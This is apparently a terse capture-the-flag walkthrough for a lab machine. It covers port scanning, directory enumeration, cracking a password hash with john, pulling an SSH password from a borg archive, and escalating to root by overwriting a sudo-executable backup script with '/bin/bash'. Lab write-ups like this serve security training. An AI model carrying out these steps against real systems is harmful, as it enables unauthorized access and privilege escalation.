port = "10.10.217.66"

open ports using nmap
```
22
80
```
![image](./images/basic/img16.png)

enumerating http
```
dir enum using dirb
- /etc
    - hash password for music_archive found
        - cracked using john
            - squidward

- /admin
    - borg archive.tar downloaded
        - install of borg
            - mounting of the archive to obtain password we can ssh to the box
                - s3cretP@s
```
![image](./images/basic/img17.png)

ssh alex@0.10.217.66

priv escalation
```
linepeas yielded nothing

sudo -l
/home/mp3backups/backup.sh - executable with sudo
    - echo '/bin/bash' > /etc/mp3backups/backup.sh
```
![image](./images/basic/img18.png)